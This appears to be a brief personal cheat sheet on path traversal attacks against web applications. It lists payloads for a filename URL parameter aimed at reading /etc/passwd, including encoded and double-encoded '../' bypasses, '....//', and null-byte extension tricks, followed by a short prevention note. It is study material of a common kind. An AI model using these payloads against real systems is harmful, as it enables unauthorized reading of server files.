# path traversal

basicaly if something is loading any kynd of file
and you can manipulate it into running or showing other files
then you can try path traversal

most times used to retrieve /etc/passwd

# filename
parameter in url
?filename=12.png

change to (absolute)
?filename=/etc/passwd

change to (relative)
?filename=../../../../etc/passwd


## sometimes a single ../ is not enough 
....//
%2e%2e%2f
%252e%252e%252f

## sometimes it needs to be include/start/end with certain path
then we can try including it
/var/www/images/../../../etc/passwd
../../../etc/passwd%00.png
../../../etc/passwd%00.jpg

## prevention
checking all input
also making sure it only accesses a certain folder
